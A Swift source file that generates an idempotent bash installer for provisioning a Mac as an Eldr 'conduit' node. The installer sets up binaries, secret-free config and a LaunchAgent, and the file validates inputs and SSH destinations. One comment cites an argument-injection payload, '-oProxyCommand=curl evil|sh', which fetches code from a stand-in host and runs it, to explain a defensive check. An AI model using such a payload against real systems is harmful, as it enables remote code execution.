import Foundation

/// Generates the idempotent bootstrap that provisions a Mac for Eldr "conduit" mode and
/// the argv `eldrctl` feeds it. A GENERATOR, not an executor — same doctrine as
/// `RelayProvisioner` (Apps/Huginn): pure, `Sendable`, unit-testable without a host, and it
/// NEVER embeds a secret value. The LLM token is seeded out-of-band via
/// `eldr-node --import-token` (stdin), so it never lands in the script, argv, the env file
/// (C-8), or shell history.
///
/// `installScript` is STATIC (a constant): every parameter reaches the script as a runtime
/// `--flag`, so the text is identical regardless of `Config`. That keeps the checked-in
/// `Apps/Huginn/install-huginn.sh` byte-identical to this constant (a golden-file test
/// enforces it) and lets `eldrctl` pipe the script over SSH without shipping the file.
public struct ConduitProvisioner: Sendable {

    /// Who answers the owner's chats on the Mac.
    public enum Responder: String, Sendable, CaseIterable {
        /// The user's OWN assistant over its local Gateway (their "current agent"). Default.
        case sybilclaw
        /// The node's own local LLM tool loop (the proven, relay-tested path).
        case eldrAcp = "eldr-acp"

        public var argument: String { rawValue }
    }

    /// Non-secret conduit configuration. No token field — by design.
    public struct Config: Sendable, Equatable {
        /// The phone's PQRC identity hex — the C-3 gate target. 64 hex chars.
        public var ownerHex: String
        /// The relay both ends share. `wss://…`.
        public var relayURL: String
        /// The C-2 jail root the agent's file tools operate in (empty ⇒ remote `$HOME`).
        public var workdir: String
        public var responder: Responder
        /// The local sybilclaw Gateway port (used only by the sybilclaw responder).
        public var gatewayPort: Int
        /// LLM endpoint for the eldr-acp responder (ignored by the sybilclaw responder).
        public var llmURL: String
        public var llmModel: String
        /// Also copy the signed `Huginn.app` to `/Applications` (full-app install).
        public var installApp: Bool
        /// Where the payload (Huginn.app, eldr-node) is staged on the TARGET. `eldrctl`
        /// scp's it here before running the script.
        public var payloadDir: String

        public init(
            ownerHex: String,
            relayURL: String = "wss://relay.lerants.com",
            workdir: String = "",
            responder: Responder = .sybilclaw,
            gatewayPort: Int = 18789,
            llmURL: String = "http://127.0.0.1:1234/v1",
            llmModel: String = "local-model",
            installApp: Bool = true,
            payloadDir: String = ""
        ) {
            self.ownerHex = ownerHex
            self.relayURL = relayURL
            self.workdir = workdir
            self.responder = responder
            self.gatewayPort = gatewayPort
            self.llmURL = llmURL
            self.llmModel = llmModel
            self.installApp = installApp
            self.payloadDir = payloadDir
        }
    }

    public enum ValidationError: Error, Equatable, CustomStringConvertible {
        case emptyOwner
        case invalidOwner(String)
        case emptyRelay
        case invalidRelay(String)
        case invalidGatewayPort(Int)

        public var description: String {
            switch self {
            case .emptyOwner:
                return "--owner is required: the phone's PQRC identity hex (the C-3 gate target)."
            case .invalidOwner(let v):
                return "--owner must be exactly 64 hex characters; got \"\(v)\"."
            case .emptyRelay:
                return "--relay is required (wss://…)."
            case .invalidRelay(let v):
                return "--relay must be a ws:// or wss:// URL; got \"\(v)\"."
            case .invalidGatewayPort(let p):
                return "--gateway-port must be 1–65535; got \(p)."
            }
        }
    }

    public let config: Config
    public init(config: Config) { self.config = config }

    /// Validate inputs before any SSH happens (mirrors `RelayProvisioner.validate`).
    public func validate() throws {
        let owner = config.ownerHex.trimmingCharacters(in: .whitespacesAndNewlines)
        if owner.isEmpty { throw ValidationError.emptyOwner }
        let isHex = owner.count == 64 && owner.allSatisfy { $0.isHexDigit }
        if !isHex { throw ValidationError.invalidOwner(owner) }

        let relay = config.relayURL.trimmingCharacters(in: .whitespacesAndNewlines)
        if relay.isEmpty { throw ValidationError.emptyRelay }
        if !(relay.hasPrefix("ws://") || relay.hasPrefix("wss://")) {
            throw ValidationError.invalidRelay(relay)
        }
        if config.gatewayPort < 1 || config.gatewayPort > 65535 {
            throw ValidationError.invalidGatewayPort(config.gatewayPort)
        }
    }

    /// Whether `destination` is safe to pass as a bare argv element to `ssh`/`scp`.
    ///
    /// `Process.arguments` bypasses the shell, so the risk is NOT `;`/backtick injection
    /// but ARGUMENT injection: OpenSSH parses argv with getopt and does not require options
    /// to precede the destination, so a value beginning with `-` (e.g.
    /// `-oProxyCommand=curl evil|sh`) is read as a client OPTION and runs an arbitrary local
    /// program. Reject a leading `-` and whitelist the `[user@]host[:port]` charset. Kept
    /// here (not in the executable) so it is unit-testable.
    public static func isSafeSSHDestination(_ destination: String) -> Bool {
        guard !destination.isEmpty, !destination.hasPrefix("-") else { return false }
        let allowed = Set(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@:")
        return destination.allSatisfy { allowed.contains($0) }
    }

    /// The argv `eldrctl` passes to the bootstrap on the target (after staging the payload).
    /// Order is stable for testability.
    public func scriptArguments() -> [String] {
        var args: [String] = [
            "--owner", config.ownerHex,
            "--relay", config.relayURL,
            "--responder", config.responder.argument,
            "--gateway-port", String(config.gatewayPort),
            "--llm-url", config.llmURL,
            "--llm-model", config.llmModel,
        ]
        if !config.workdir.isEmpty { args += ["--workdir", config.workdir] }
        if !config.payloadDir.isEmpty { args += ["--payload", config.payloadDir] }
        if config.installApp { args.append("--with-app") }
        return args
    }

    /// The `pqrc:add?npub=…&type=coding_agent` deep link the phone scans. `npub` is already
    /// bech32 (the node computes it); this only formats. Same shape as
    /// `ACPBridgeService.deepLink` and `eldr-node --print-pairing-link`.
    public static func pairingLink(npub: String, relay: String?) -> String {
        var link = "pqrc:add?npub=\(npub)&type=coding_agent"
        if let relay, !relay.isEmpty,
            let encoded = relay.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed)
        {
            link += "&relay=\(encoded)"
        }
        return link
    }

    /// The LaunchAgent label the bootstrap installs.
    public static let launchAgentLabel = "chat.eldr.node"

    /// The idempotent bootstrap. STATIC: everything is a runtime `--flag`, so this never
    /// carries a `Config` value (and never a secret). Authored byte-identical to
    /// `Apps/Huginn/install-huginn.sh` (golden-file test).
    public static let installScript: String = #"""
    #!/bin/bash
    # install-huginn.sh — provision a Mac for Eldr "conduit" mode over SSH.
    #
    # Generated by ConduitProvisioner (Packages/Eldrctl). Run on the TARGET Mac, e.g.:
    #   ssh user@host 'bash -s' -- --owner <hex> --relay <wss> --payload <dir> < install-huginn.sh
    # or let `eldrctl install --target user@host …` stage the payload and run it for you.
    #
    # SECRET-FREE: the LLM token is NEVER an argument here. After this runs, seed it with:
    #   printf %s "$ELDR_LLM_TOKEN" | ssh user@host '~/.local/bin/eldr-node --import-token'
    #
    # HARD REQUIREMENT: the target must have an UNLOCKED user session (auto-login is fine).
    # Long-term secrets are WhenUnlockedThisDeviceOnly — the Keychain is unreadable at the
    # login window, so a Mac sitting at loginwindow cannot be provisioned or serve.
    set -euo pipefail

    OWNER=""; RELAY=""; WORKDIR=""; RESPONDER="sybilclaw"; GATEWAY_PORT="18789"
    LLM_URL="http://127.0.0.1:1234/v1"; LLM_MODEL="local-model"; PAYLOAD=""
    WITH_APP="0"; DRY_RUN="0"

    while [ "$#" -gt 0 ]; do
      case "$1" in
        --owner) OWNER="$2"; shift 2;;
        --relay) RELAY="$2"; shift 2;;
        --workdir) WORKDIR="$2"; shift 2;;
        --responder) RESPONDER="$2"; shift 2;;
        --gateway-port) GATEWAY_PORT="$2"; shift 2;;
        --llm-url) LLM_URL="$2"; shift 2;;
        --llm-model) LLM_MODEL="$2"; shift 2;;
        --payload) PAYLOAD="$2"; shift 2;;
        --with-app) WITH_APP="1"; shift;;
        --dry-run) DRY_RUN="1"; shift;;
        *) echo "install-huginn.sh: unknown argument: $1" >&2; exit 2;;
      esac
    done

    die() { echo "install-huginn.sh: $1" >&2; exit 2; }

    # --- Validate (mirrors ConduitProvisioner.validate) -------------------------------
    [ -n "$OWNER" ] || die "--owner <64-hex phone identity> is required (the C-3 gate target)."
    case "$OWNER" in *[!0-9a-fA-F]*) die "--owner must be 64 hex characters." ;; esac
    [ "${#OWNER}" -eq 64 ] || die "--owner must be exactly 64 hex characters."
    [ -n "$RELAY" ] || die "--relay <wss://...> is required."
    case "$RELAY" in ws://*|wss://*) ;; *) die "--relay must start with ws:// or wss://." ;; esac
    [ -n "$WORKDIR" ] || WORKDIR="$HOME"

    BIN_DIR="$HOME/.local/bin"
    CFG_DIR="$HOME/.config/eldr-acp"
    LA_DIR="$HOME/Library/LaunchAgents"
    PLIST="$LA_DIR/chat.eldr.node.plist"
    LABEL="chat.eldr.node"
    UID_NUM="$(id -u)"

    mkdir -p "$BIN_DIR" "$CFG_DIR" "$LA_DIR"

    # --- Preflight --------------------------------------------------------------------
    if [ "$DRY_RUN" = "0" ]; then
      case "$(uname -s)" in Darwin) ;; *) die "this installer targets macOS." ;; esac
      if ! launchctl print "gui/$UID_NUM" >/dev/null 2>&1; then
        die "no unlocked GUI session for uid $UID_NUM. Log in (or enable auto-login) on the target Mac, then re-run — the data-protection Keychain is unreadable at the login window."
      fi
    fi

    # --- Locate the staged payload (Huginn.app + eldr-node) ---------------------------
    APP_SRC=""; NODE_SRC=""; ACP_SRC=""
    if [ -n "$PAYLOAD" ]; then
      [ -d "$PAYLOAD/Huginn.app" ] && APP_SRC="$PAYLOAD/Huginn.app"
      [ -f "$PAYLOAD/eldr-node" ] && NODE_SRC="$PAYLOAD/eldr-node"
      [ -f "$PAYLOAD/eldr-acp" ] && ACP_SRC="$PAYLOAD/eldr-acp"
    fi
    if [ -z "$NODE_SRC" ] && [ -f "/Applications/Huginn.app/Contents/Resources/eldr-node" ]; then
      NODE_SRC="/Applications/Huginn.app/Contents/Resources/eldr-node"
    fi

    # --- Install the full app (optional) ----------------------------------------------
    if [ "$WITH_APP" = "1" ] && [ -n "$APP_SRC" ]; then
      echo "==> Installing $APP_SRC -> /Applications/Huginn.app"
      if [ "$DRY_RUN" = "0" ]; then
        ditto "$APP_SRC" "/Applications/Huginn.app"
        xattr -dr com.apple.quarantine "/Applications/Huginn.app" 2>/dev/null || true
        codesign --verify --strict "/Applications/Huginn.app" || die "Huginn.app failed codesign --verify."
        spctl -a -t exec "/Applications/Huginn.app" 2>/dev/null || echo "  note: Gatekeeper assessment did not pass (unsigned dev build?)."
      fi
      [ -z "$NODE_SRC" ] && [ -f "/Applications/Huginn.app/Contents/Resources/eldr-node" ] && NODE_SRC="/Applications/Huginn.app/Contents/Resources/eldr-node"
    fi

    # --- Install the node binary ------------------------------------------------------
    [ -n "$NODE_SRC" ] || die "eldr-node binary not found. Pass --payload <dir containing eldr-node> or install Huginn.app."
    echo "==> Installing eldr-node -> $BIN_DIR/eldr-node"
    if [ "$DRY_RUN" = "0" ]; then
      install -m 0755 "$NODE_SRC" "$BIN_DIR/eldr-node"
      [ -n "$ACP_SRC" ] && install -m 0755 "$ACP_SRC" "$BIN_DIR/eldr-acp"
    fi

    # --- Write conduit config (NO token here — C-8) -----------------------------------
    umask 077
    cat > "$CFG_DIR/env" <<ENVEOF
    # Written by install-huginn.sh — do not edit by hand. No token here (C-8: it lives in
    # the Keychain, seeded via 'eldr-node --import-token').
    export ELDR_LLM_URL='$LLM_URL'
    export ELDR_LLM_MODEL='$LLM_MODEL'
    export PQRC_RELAY_URL='$RELAY'
    ENVEOF
    printf '%s\n' "$OWNER" > "$CFG_DIR/owner"
    printf '%s\n' "$WORKDIR" > "$CFG_DIR/workdir"
    printf '%s\n' "$RESPONDER" > "$CFG_DIR/responder"

    # --- Write + load the LaunchAgent (Aqua session => Keychain unlocked) -------------
    cat > "$PLIST" <<PLISTEOF
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
      <key>Label</key><string>$LABEL</string>
      <key>ProgramArguments</key>
      <array>
        <string>$BIN_DIR/eldr-node</string>
        <string>--owner</string><string>$OWNER</string>
        <string>--relay</string><string>$RELAY</string>
        <string>--workdir</string><string>$WORKDIR</string>
        <string>--responder</string><string>$RESPONDER</string>
        <string>--gateway-port</string><string>$GATEWAY_PORT</string>
      </array>
      <key>RunAtLoad</key><true/>
      <key>KeepAlive</key><true/>
      <key>LimitLoadToSessionType</key><string>Aqua</string>
      <key>StandardOutPath</key><string>$CFG_DIR/eldr-node.log</string>
      <key>StandardErrorPath</key><string>$CFG_DIR/eldr-node.log</string>
    </dict>
    </plist>
    PLISTEOF

    if [ "$DRY_RUN" = "0" ]; then
      launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
      echo "==> LaunchAgent $LABEL loaded (RunAtLoad, KeepAlive)."
    fi

    cat <<'HINT'

    Next: seed the LLM token. Pipe it over SSH so it never touches disk, argv, or history:

        printf %s "$ELDR_LLM_TOKEN" | ssh <user@host> '~/.local/bin/eldr-node --import-token'

    HINT

    if [ "$DRY_RUN" = "0" ]; then
      echo "Pairing link — scan or paste into EldrChat (new conversation):"
      "$BIN_DIR/eldr-node" --print-pairing-link --relay "$RELAY" || true
    fi
    """#
}
